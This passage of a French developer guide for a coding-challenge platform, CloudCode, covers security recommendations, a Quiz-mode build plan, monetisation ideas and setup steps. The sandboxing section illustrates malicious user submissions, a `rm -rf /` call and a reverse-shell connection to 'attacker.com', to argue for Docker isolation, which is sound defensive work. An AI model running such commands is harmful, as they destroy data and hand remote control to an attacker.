| **Validation DTOs** | `[Required]` `[EmailAddress]` `[StringLength]` `[RegularExpression]` sur Register, Login, Reset, Change password |
| **Username format** | Regex `^[a-zA-Z0-9_\-]+$` · 3–30 chars · validé côté serveur |
| **XSS comments** | Strip des balises HTML avant stockage en base |
| **Body size limit** | 1 MB global via Kestrel |
| **Admin policy** | `[Authorize(Policy = "AdminOnly")]` sur tous les endpoints admin |
| **SQL injection** | Requêtes LINQ uniquement (EF Core) · `ExecuteSqlInterpolatedAsync` paramétré pour VsMatches |
| **JWT validation** | Issuer + Audience + Lifetime + Signing key validés · ClockSkew = 0 |
| **Refresh token rotation** | Nouveau token à chaque refresh · Invalidation à la déconnexion |

### 🔴 Recommandations de sécurité — À implémenter avant mise en production

#### Priorité 1 — CRITIQUE (bloquerait la mise en prod)

**1. Déplacer tous les secrets hors du code**

Les secrets suivants sont actuellement dans `appsettings.json` (fichier versionné) :
- `Jwt:SecretKey` → clé de signature JWT — si compromise, n'importe qui peut forger des tokens admin
- `Resend:ApiKey` → clé API email exposée dans Git

**Solution :** utiliser des variables d'environnement ou un secrets manager (Azure Key Vault, AWS Secrets Manager, ou simplement `.env` non commité).

```bash
# Exemple : remplacer dans appsettings.json par des placeholders
"Jwt": { "SecretKey": "" }
"Resend": { "ApiKey": "" }

# Et définir en variable d'environnement au démarrage :
export Jwt__SecretKey="ma_vraie_cle_tres_longue_et_aleatoire"
export Resend__ApiKey="re_xxxxx"
```

La clé JWT doit faire **au moins 32 caractères aléatoires** (pas un texte lisible).

---

**2. JWT dans localStorage → migrer vers httpOnly cookies**

Actuellement (`frontend/src/stores/authStore.ts`) :
```typescript
localStorage.setItem('accessToken', accessToken);  // ← XSS vuln
```

N'importe quel script injecté (XSS, extension malveillante, CDN compromis) peut lire ce token et usurper l'identité de l'utilisateur.

**Solution :** stocker le token dans un cookie `httpOnly; Secure; SameSite=Strict`.

Backend — retourner le token en cookie plutôt que dans le body :
```csharp
Response.Cookies.Append("accessToken", accessToken, new CookieOptions {
    HttpOnly = true,
    Secure = true,
    SameSite = SameSiteMode.Strict,
    Expires = DateTimeOffset.UtcNow.AddMinutes(60)
});
```

Frontend — supprimer tout `localStorage.setItem/getItem` pour les tokens, et envoyer les requêtes avec `credentials: 'include'`.

---

#### Priorité 2 — HAUTE (risque opérationnel sérieux)

**3. Sandboxer l'exécution de code utilisateur**

`JudgeService.cs` exécute directement `python` et `node` sur le serveur sans isolation. Un utilisateur peut soumettre :
```python
import os; os.system("rm -rf /")
import socket; socket.connect(("attacker.com", 4444))  # reverse shell
```

**Solution :** exécuter chaque soumission dans un conteneur Docker éphémère avec :
- Réseau désactivé (`--network none`)
- Filesystem read-only sauf `/tmp`
- CPU et mémoire limités (`--cpus 0.5 --memory 128m`)
- Timeout strict (`--stop-timeout 10`)

```bash
docker run --rm --network none --read-only --memory 128m --cpus 0.5 \
  --tmpfs /tmp python:3.11-slim python /tmp/solution.py
```

---

**4. HSTS (HTTP Strict Transport Security)**

Ajoute ce header pour forcer HTTPS sur tous les navigateurs qui ont déjà visité le site :
```csharp
// Dans Program.cs, après app.UseHttpsRedirection()
app.UseHsts();  // ou configurer manuellement :
// Response.Headers.Add("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
```

---

**5. Headers de sécurité HTTP**

Ajouter un middleware pour les headers de sécurité essentiels :
```csharp
app.Use(async (context, next) =>
{
    context.Response.Headers.Append("X-Content-Type-Options", "nosniff");
    context.Response.Headers.Append("X-Frame-Options", "DENY");
    context.Response.Headers.Append("Referrer-Policy", "strict-origin-when-cross-origin");
    context.Response.Headers.Append("Permissions-Policy", "camera=(), microphone=(), geolocation=()");
    await next();
});
```

---

#### Priorité 3 — MOYENNE (bonne hygiène)

**6. Confirmation d'email à l'inscription**

Actuellement `EmailConfirmed = false` mais n'est jamais vérifié. N'importe qui peut s'inscrire avec l'email de quelqu'un d'autre.

**Solution :**
- Générer un token de vérification à l'inscription
- Envoyer un email avec lien `GET /auth/verify-email?token=xxx`
- Bloquer la connexion tant que `EmailConfirmed = false` (ou au moins afficher un avertissement)

---

**7. Protection des tokens SignalR**

Les tokens JWT passent actuellement en query string pour SignalR (`/hubs/vs?access_token=xxx`). Ces tokens apparaissent dans les logs serveur, l'historique du navigateur et les headers Referer.

**Solution :** utiliser le cookie httpOnly (fix #2) comme transport pour SignalR également — SignalR supporte nativement les cookies.

---

**8. Backup automatique de la base de données**

SQLite stocke tout dans un seul fichier `CloudCode.db`. En cas de crash disque ou erreur de manipulation, toutes les données sont perdues (comme les 26 challenges perdus précédemment).

**Solution :**
```bash
# Cron toutes les heures : copie atomique de la DB
0 * * * * sqlite3 /app/CloudCode.db ".backup '/backups/CloudCode_$(date +\%Y\%m\%d_\%H\%M).db'"
# Garder 7 jours de backups
find /backups -name "*.db" -mtime +7 -delete
```

---

**9. `AllowedHosts` — restreindre en production**

`appsettings.json` : `"AllowedHosts": "*"` → vulnérable aux attaques par Host header injection.

En production, remplacer par le domaine exact :
```json
"AllowedHosts": "cloudcode.io;www.cloudcode.io"
```

---

## 10. Plan — Quiz Mode (Normal + VS)

> Feature à implémenter. Plan complet rédigé le 14 mars 2026.

### Concept

**Quiz Normal** (`/quiz`) — Solo, QCM, 10 questions, 30s par question, score à la fin.

**Quiz VS** (`/quiz/vs`) — 1v1 en temps réel via SignalR, même pool de questions, 20s par question, premier correct = 2 pts, les deux corrects = 1 pt chacun, système ELO.

---

### Fichiers à créer / modifier (ordre d'implémentation)

#### Étape 1 — Domain (entités + enums)

| Fichier | Action | Contenu |
|---|---|---|
| `src/CloudCode.Domain/Enums/QuizEnums.cs` | CRÉER | `QuizCategory` (Python=1, JavaScript=2, Algorithms=3, DataStructures=4, GeneralCS=5) · `QuizDifficulty` (Easy/Medium/Hard) · `QuizSessionStatus` (InProgress/Completed/Abandoned) · `QuizVsMatchStatus` (Waiting/InProgress/Finished/Cancelled) |
| `src/CloudCode.Domain/Entities/QuizQuestion.cs` | CRÉER | Id, Text, OptionA/B/C/D, CorrectOption (0=A…3=D), Category, Difficulty, Explanation?, IsPublished |
| `src/CloudCode.Domain/Entities/QuizSession.cs` | CRÉER | UserId, Category, Difficulty, Status, Score, TotalQuestions=10, CorrectAnswers, CompletedAt? + nav User + nav Answers |
| `src/CloudCode.Domain/Entities/QuizSessionAnswer.cs` | CRÉER | SessionId, QuestionId, QuestionIndex (0–9), SelectedOption?, IsCorrect, TimeTakenMs |
| `src/CloudCode.Domain/Entities/QuizVsMatch.cs` | CRÉER | Player1Id, Player2Id, QuestionIds (JSON list), Status, WinnerId?, Player1/2Score, Player1/2EloChange, CurrentQuestionIndex, Player1/2Finished, StartedAt?, FinishedAt? |
| `src/CloudCode.Domain/Entities/QuizVsAnswer.cs` | CRÉER | MatchId, PlayerId, QuestionId, QuestionIndex, SelectedOption?, IsCorrect, TimeTakenMs, IsFirst (= 2 pts) |
| `src/CloudCode.Domain/Entities/QuizRank.cs` | CRÉER | Même structure que `VsRank` : UserId, Elo=1000, Wins, Losses, Draws, CurrentStreak, BestStreak + `GetTier()` |

#### Étape 2 — Infrastructure : EF Core

| Fichier | Action | Contenu |
|---|---|---|
| `src/CloudCode.Infrastructure/Data/Configurations/QuizConfiguration.cs` | CRÉER | Fluent config pour les 6 tables : QuizQuestions, QuizSessions, QuizSessionAnswers, QuizVsMatches, QuizVsAnswers, QuizRanks — FKs, indexes, colonnes TEXT pour Guid |
| `src/CloudCode.Infrastructure/Data/Migrations/20260314120000_AddQuizEntities.cs` | CRÉER | Migration manuelle : `Up()` crée les 6 tables dans l'ordre de dépendance, `Down()` les supprime |
| `src/CloudCode.Infrastructure/Data/Migrations/20260314120000_AddQuizEntities.Designer.cs` | CRÉER | Stub `[DbContext][Migration]` minimal |
| `src/CloudCode.Infrastructure/Data/ApplicationDbContext.cs` | MODIFIER | Ajouter 6 DbSet après `VsRanks` : `QuizQuestions, QuizSessions, QuizSessionAnswers, QuizVsMatches, QuizVsAnswers, QuizRanks` |

#### Étape 3 — Application (interfaces + DTOs)

| Fichier | Action | Contenu |
|---|---|---|
| `src/CloudCode.Application/DTOs/Quiz/QuizDtos.cs` | CRÉER | `QuizQuestionDto` (sans bonne réponse) · `QuizQuestionRevealDto` (avec CorrectOption + Explanation) · `QuizSessionDto` (avec liste `Questions` pour le frontend) · `QuizSessionAnswerDto` · `QuizRankDto` · `QuizLeaderboardEntryDto` · `QuizVsMatchDto` · `QuizVsPlayerDto` · request DTOs : `StartQuizDto`, `SubmitAnswerDto` · SignalR payloads : `QuizMatchFoundPayload`, `QuizQuestionPayload`, `QuizOpponentAnsweredPayload`, `QuizQuestionResultPayload`, `QuizMatchEndedPayload` |
| `src/CloudCode.Application/Interfaces/IQuizService.cs` | CRÉER | Solo : `StartSession, SubmitAnswer, GetSession, GetSessionHistory, AbandonSession` · VS : `GetOrCreateRank, GetLeaderboard, CreateVsMatch, GetVsMatch, GetVsMatchHistory, SubmitVsAnswer, BothAnsweredQuestion` · Interface séparée `IQuizMatchmakingService` : `TryEnqueue(userId, category, difficulty)`, `Dequeue`, `IsInQueue`, `QueueSize` |

#### Étape 4 — Infrastructure (services)

| Fichier | Action | Contenu |
|---|---|---|
| `src/CloudCode.Infrastructure/Services/QuizMatchState.cs` | CRÉER | Singleton `ConcurrentDictionary` — suit qui a répondu à quelle question par match · `TryRecordAnswer()`, `BothAnswered()`, `CloseQuestion()`, `RemoveMatch()` |
| `src/CloudCode.Infrastructure/Services/QuizService.cs` | CRÉER | Solo : `StartSessionAsync` → 10 questions aléatoires par catégorie/difficulté, `SubmitAnswerAsync` → évalue, révèle, clôture si dernière question · VS : `CreateVsMatchAsync` → tire 10 questions, sérialise en JSON, `SubmitVsAnswerAsync` → détermine `IsFirst`, attribue 2 pts ou 1 pt, calcul ELO (copie de `VsService.UpdateElo`) |
| `src/CloudCode.Infrastructure/Services/QuizMatchmakingService.cs` | CRÉER | Singleton, même pattern que `MatchmakingService.cs` · Queue d'entrée `(UserId, Category, Difficulty, JoinedAt)` · Match si même `Category + Difficulty` |
| `src/CloudCode.Infrastructure/Data/QuizSeeder.cs` | CRÉER | 30 questions (6 par catégorie × 5 catégories, mix Easy/Medium/Hard) · Insère seulement si table vide · Voir liste complète ci-dessous |

#### Étape 5 — API

| Fichier | Action | Contenu |
|---|---|---|
| `src/CloudCode.API/Controllers/QuizController.cs` | CRÉER | `[Authorize]` · `POST /api/quiz/sessions` · `GET /api/quiz/sessions/{id}` · `GET /api/quiz/sessions` · `POST /api/quiz/sessions/{id}/answers` · `POST /api/quiz/sessions/{id}/abandon` · `GET /api/quiz/vs/rank` · `GET /api/quiz/vs/rank/{userId}` · `GET /api/quiz/vs/leaderboard [AllowAnonymous]` · `GET /api/quiz/vs/matches` · `GET /api/quiz/vs/matches/{id}` · `POST /api/quiz/vs/matches/{id}/abandon` |
| `src/CloudCode.API/Hubs/QuizHub.cs` | CRÉER | `[Authorize]` · `JoinQueue(int category, int difficulty)` → matchmaking → `MatchFound` ou `QueueJoined` · `LeaveQueue()` · `JoinMatchRoom(string matchId)` → groupe `quiz-match-{id}` → envoie première question · `SubmitVsAnswer(matchId, questionIndex, selectedOption?, timeTakenMs)` → `OpponentAnswered` aux autres → si les deux ont répondu : `QuestionResult` → 3s delay → question suivante ou `MatchEnded` · `OnDisconnectedAsync` → Dequeue |

#### Étape 6 — DI + Program.cs

| Fichier | Action |
|---|---|
| `src/CloudCode.Infrastructure/DependencyInjection.cs` | Ajouter `AddScoped<IQuizService, QuizService>()` · `AddSingleton<IQuizMatchmakingService, QuizMatchmakingService>()` · `AddSingleton<QuizMatchState>()` |
| `src/CloudCode.API/Program.cs` | Après `ChallengeSeeder` : `await QuizSeeder.SeedQuestionsAsync(app.Services)` · Après `VsHub` : `app.MapHub<QuizHub>("/hubs/quiz")` |

#### Étape 7 — Frontend

| Fichier | Action | Contenu |
|---|---|---|
| `frontend/src/types/index.ts` | MODIFIER | Ajouter enums `QuizCategory/Difficulty/SessionStatus/VsMatchStatus` + interfaces `QuizQuestion, QuizQuestionReveal, QuizSession, QuizSessionAnswer, QuizRank, QuizLeaderboardEntry, QuizVsMatch, QuizVsPlayer` + payloads SignalR |
| `frontend/src/lib/api.ts` | MODIFIER | Ajouter `quizApi` : `startSession, getSession, getSessionHistory, submitAnswer, abandonSession, getMyRank, getRank, getLeaderboard, getVsMatch, getVsHistory, abandonVsMatch` |
| `frontend/src/app/quiz/page.tsx` | CRÉER | Phase `'select'` → choisir catégorie + difficulté · Phase `'playing'` → question + timer 30s animé + 4 boutons A/B/C/D (touche clavier A/B/C/D) + reveal après réponse · Phase `'finished'` → score X/10, tableau récapitulatif |
| `frontend/src/app/quiz/vs/page.tsx` | CRÉER | Lobby identique à `/vs/page.tsx` + sélecteur catégorie/difficulté · SignalR `/hubs/quiz` · `MatchFound` → `router.push('/quiz/vs/'+matchId)` |
| `frontend/src/app/quiz/vs/[matchId]/page.tsx` | CRÉER | Phase `'question'` → question + timer 20s + 4 boutons + badge "Adversaire a répondu" · Phase `'reveal'` → bonne réponse en vert, mauvaise en rouge, points gagnés · Phase `'finished'` → banner Win/Loss/Draw, scores, ELO change |
| `frontend/src/app/quiz/history/page.tsx` | CRÉER | Liste des sessions solo : date, catégorie, difficulté, score X/10 |
| `frontend/src/components/Navbar.tsx` | MODIFIER | Ajouter lien "Quiz" à côté de "VS" |

---

### Questions du seeder (30 questions)

#### Python (6)
1. **Easy** — `len([1, 2, 3])` → **3**
2. **Easy** — Quel type est immuable ? → **tuple**
3. **Medium** — Output de `[x**2 for x in range(3)]` → **[0,1,4]**
4. **Medium** — `*args` permet… → **nombre variable d'arguments positionnels**
5. **Hard** — Complexité lookup dictionnaire Python → **O(1) average**
6. **Hard** — `__slots__` dans une classe Python → **restreint les attributs d'instance**

#### JavaScript (6)
1. **Easy** — `typeof null` → **'object'**
2. **Easy** — Ajouter à la fin d'un tableau → **push()**
3. **Medium** — `0.1 + 0.2 === 0.3` → **false**
4. **Medium** — Opérateur `?.` → **optional chaining**
5. **Hard** — Différence `==` vs `===` → **=== vérifie type et valeur**
6. **Hard** — Closure en JS → **fonction avec accès aux variables de sa portée externe**

#### Algorithms (6)
1. **Easy** — Complexité binary search → **O(log n)**
2. **Easy** — Pire cas O(n²) → **Bubble Sort**
3. **Medium** — Structure de données du BFS → **Queue**
4. **Medium** — Mémoïsation → **cache des résultats d'appels coûteux**
5. **Hard** — Quicksort cas moyen → **O(n log n)**
6. **Hard** — Master theorem → **analyse récurrences diviser-pour-régner**

#### Data Structures (6)
1. **Easy** — Stack : opération d'ajout → **push**
2. **Easy** — Nœud arbre binaire : max enfants → **2**
3. **Medium** — Insertion BST équilibré → **O(log n)**
4. **Medium** — Priority queue efficace → **Heap**
5. **Hard** — Complexité spatiale hash table → **O(n)**
6. **Hard** — Niveaux attendus skip list → **O(log n)**

#### General CS (6)
1. **Easy** — RAM = → **Random Access Memory**
2. **Easy** — HTTP = → **HyperText Transfer Protocol**
3. **Medium** — Processus vs Thread → **threads partagent mémoire d'un processus**
4. **Medium** — SOLID → **Single responsibility, Open/closed, Liskov, Interface segregation, Dependency inversion**
5. **Hard** — Théorème CAP → **Consistency, Availability, Partition tolerance (2 sur 3 garantissables)**
6. **Hard** — TCP vs UDP → **TCP orienté connexion fiable ; UDP sans connexion plus rapide**

---

### Décisions d'architecture clés

| Décision | Raison |
|---|---|
| Soumission VS via **SignalR** (pas HTTP) | Temps critique — détermine `IsFirst` pour les 2 pts |
| **Timer côté client** avec déduplication serveur | Évite `Task.Delay` en boucle sur le hub · `QuizMatchState` ignore les doublons |
| `QuestionIds` stocké en **JSON dans la colonne** | Évite table de jonction pour 10 IDs fixes · SQLite TEXT suffit |
| `QuizSessionDto` inclut la **liste de questions** | Frontend affiche les 10 questions sans 10 requêtes API |
| Matchmaking sur **exact Category+Difficulty** | Équité du match — questions identiques en difficulté |

---

## 11. Plan de monétisation

### Vue d'ensemble

CloudCode est idéalement positionné pour un modèle **Freemium + Abonnement**, similaire à LeetCode (qui génère ~30-40M$/an). Le VS mode compétitif est le meilleur différenciateur.

### Prérequis avant de monétiser

| Prérequis | Pourquoi | Urgence |
|---|---|---|
| **Hébergement public** | Sans URL publique = 0 clients | ★★★★★ |
| **Migration PostgreSQL** | SQLite ne supporte pas la concurrence | ★★★★★ |
| **Système email (SMTP)** | Vérification compte + reçus Stripe | ★★★★★ |
| **Page Profil** | Afficher badge Premium, stats | ★★★★ |
| **HTTPS** | Obligatoire pour Stripe | ★★★★★ |

### Modèles de monétisation classés par potentiel

| Rang | Modèle | Revenu potentiel | Délai | Complexité |
|---|---|---|---|---|
| 1 | **Freemium + Abonnement Premium** | 5–40k$/mois (à 1k–5k users payants) | 1–3 mois | Moyenne |
| 2 | **Cours approfondis payants** | 2–15k$/mois | 1–2 mois | Faible–Moyenne |
| 3 | **VS Mode avec mise virtuelle (gems)** | 1–20k$/mois si viral | 2–4 mois | Moyenne–Haute |
| 4 | **Partenariats entreprises / recruteurs** | 3–30k$/mois (B2B) | 4–8 mois | Haute |
| 5 | **Boutique cosmétique** | 500–5k$/mois | 1 mois | Moyenne |
| 6 | **Certifications payantes** | 1–10k$/mois | 3–6 mois | Moyenne |
| 7 | **Affiliation** | 300–4k$/mois | 2 semaines | Faible |
| 8 | **Publicités sponsorisées** | 500–8k$/mois | 1 mois | Faible |

### Modèle #1 — Freemium + Premium (prioritaire)

**Prix cible** : 4,99–9,99$/mois ou 49–89$/an

| Feature | Gratuit | Premium |
|---|---|---|
| Challenges Easy | ✅ Tous | ✅ Tous |
| Challenges Medium | ✅ Tous | ✅ Tous |
| Challenges Hard | ❌ (3 max) | ✅ Illimités |
| Challenges "Pro" (futurs) | ❌ | ✅ |
| Soumissions par jour | 10 | Illimitées |
| Hints / indices | 1 par challenge | Illimités |
| Solution officielle | ❌ | ✅ |
| Streak save | ❌ | ✅ (1x par semaine) |
| VS Mode casual | ✅ | ✅ |
| VS Mode ranked | ✅ (limité) | ✅ Illimité |
| Badge Premium visible | — | ✅ |
| Export statistiques PDF | ❌ | ✅ |
| Publicités | Oui | Non |

**Implémentation backend** :
- Ajouter `IsPremium` (bool) + `PremiumExpiresAt` (DateTime?) sur `User`
- Middleware `[RequirePremium]` sur endpoints premium
- Webhook Stripe → met à jour `IsPremium` + `PremiumExpiresAt`

### Modèle #5 — Boutique cosmétique (rapide à lancer)

Items vendables (1,99–9,99$ pièce) :
- Avatars custom (3D, vu que Three.js est déjà intégré)
- Thèmes éditeur Monaco (dark blue, neon, etc.)
- Badges rares sur le profil
- Frames de profil animées

### Roadmap de lancement (6 mois)

```
Mois 1 : ✅ FAIT — Page Profil + Streak + Solution officielle + Hints
         + Discussion chat iMessage + 51 challenges (Easy/Medium/Hard)
         + Quiz solo + VS, Badges, Profil public, Admin panel
         → Fondation de l'expérience

Mois 2 : ✅ FAIT — Stripe + Système Premium complet (Checkout, webhooks)
         + Gating Courses/Quiz/VS/Hard challenges + Page Pricing
         → Premier dollar encaissé possible

Mois 3 : Hébergement (Railway) + Vercel + domaine custom + HTTPS
         + Secrets en variables d'env + Vérification domaine Resend
         → App accessible publiquement, Stripe live

Mois 4 : Notifications email (streak en danger, résultat VS)
         + Badge Premium sur profil + Annulation abonnement dans profil
         + Sandboxing exécution code (Docker)
         → Engagement + sécurité prod

Mois 5 : VS Mode "gems" (monnaie virtuelle achetable)
         + Challenges "Pro" exclusifs Premium (contenu additionnel)
         → Rétention

Mois 6 : Certifications + Partenariats recruteurs
         → B2B, revenu plus élevé par client
```

### Estimation revenus réalistes (scénarios)

| Scénario | Users actifs | % Premium | Prix/mois | Revenu mensuel |
|---|---|---|---|---|
| Conservateur | 500 | 5% | 7,99$ | ~200$/mois |
| Modéré | 2 000 | 8% | 7,99$ | ~1 280$/mois |
| Optimiste | 5 000 | 10% | 9,99$ | ~5 000$/mois |
| Ambitieux | 20 000 | 7% | 9,99$ | ~14 000$/mois |

### Stack de paiement recommandée

| Outil | Usage | Coût |
|---|---|---|
| **Stripe** | Paiement carte, abonnements, webhooks | 2,9% + 0,30$ par transaction |
| **Stripe Billing** | Gestion abonnements (relances, prorations) | Inclus Stripe |
| **Resend** | Emails transactionnels (reçus, vérification) | Gratuit jusqu'à 3k/mois |
| **Railway** | Hébergement backend .NET + PostgreSQL | ~5–20$/mois |
| **Vercel** | Hébergement frontend Next.js | Gratuit (hobby) |

---

## 11. Lancer le projet

### Prérequis

- .NET 8 SDK
- Node.js 18+
- Python 3.10+ (pour l'exécution des challenges Python)
- Node.js dans PATH (pour les challenges JavaScript)

### Backend

```bash
cd src/CloudCode.API
dotnet run
# Démarre sur http://localhost:5072
# Les migrations sont appliquées automatiquement au démarrage
# Le seeder injecte les 25 challenges de base au démarrage (upsert par slug)
# Les 30 challenges supplémentaires ont été ajoutés directement en DB via script Python
```

### Frontend

```bash
cd frontend
npm install
npm run dev
# Démarre sur http://localhost:3000
```

### Variables d'environnement Frontend

Créer `frontend/.env.local` :
```env
NEXT_PUBLIC_API_URL=http://localhost:5072
```

### Variables d'environnement Backend

`src/CloudCode.API/appsettings.json` :
```json
{
  "ConnectionStrings": {
    "DefaultConnection": "Data Source=CloudCode.db"
  },
  "JwtSettings": {
    "SecretKey": "...",
    "Issuer": "CloudCode",
    "Audience": "CloudCode",
    "AccessTokenExpiryMinutes": 60,
    "RefreshTokenExpiryDays": 7
  },
  "AllowedOrigins": ["http://localhost:3000"]
}
```

### Créer un compte Admin

1. Créer un compte normal via `/register`
2. Aller dans la DB SQLite : `UPDATE Users SET IsAdmin = 1 WHERE Email = 'ton@email.com';`
3. Ou passer par `/api/admin/users/{id}/toggle-admin` si un admin existe déjà

---

## 12. Configuration

### Durée des tokens JWT

Dans `appsettings.json` :
```json
"AccessTokenExpiryMinutes": 60,
"RefreshTokenExpiryDays": 7
```

### Timeout d'exécution du code

Dans `JudgeService.cs` :
```csharp
private const int ExecutionTimeoutMs = 5000; // 5 secondes
```

### Limites du Judge

- Max 200 résultats de recherche
- Timeout 5s par test case
- Normalisation output : trim + lowercase pour les comparaisons

### CORS

Dans `appsettings.json` :
```json
"AllowedOrigins": ["http://localhost:3000", "https://tondomaine.com"]
```

---

## 13. Conventions et patterns

### Nommage Backend

- Controllers : `{Resource}Controller.cs`
- Services : `I{Name}Service` (interface) + `{Name}Service` (implémentation)
- DTOs : `{Resource}{Action}Dto` (ex: `CreateChallengeDto`)
- Migrations : `{date}_{description}` (ex: `20260307021701_AddChallengeEntities`)

### Nommage Frontend

- Pages : `page.tsx` dans le dossier route
- Stores : `{name}Store.ts`
- Types : regroupés dans `types/index.ts`
- API clients : `{resource}Api` dans `lib/api.ts`

### Challenges — Format fonction

```python
# StarterCodePython
def function_name(param1, param2):
    pass

# TestRunnerPython (caché, appended par JudgeService)
import sys
data = sys.stdin.read().split('\n')
# ... lire les inputs, appeler la fonction, print(result)
```

```javascript
// StarterCodeJavaScript
function functionName(param1, param2) {
    // Write your solution here
}

// TestRunnerJavaScript (caché)
const data = require('fs').readFileSync(0, 'utf8').trim().split('\n');
// ... lire les inputs, appeler la fonction, console.log(result)
```

### LocalStorage — Convention de clés

| Clé | Contenu |
|---|---|
| `accessToken` | JWT access token |
| `refreshToken` | JWT refresh token |
| `cc_code_{userId}_{slug}_py` | Code Python sauvegardé par user+challenge |
| `cc_code_{userId}_{slug}_js` | Code JavaScript sauvegardé par user+challenge |
| `auth-storage` | State Zustand persisté (user) |

---

*Ce guide couvre l'état de l'application au 14 mars 2026. Mettre à jour après chaque feature importante.*
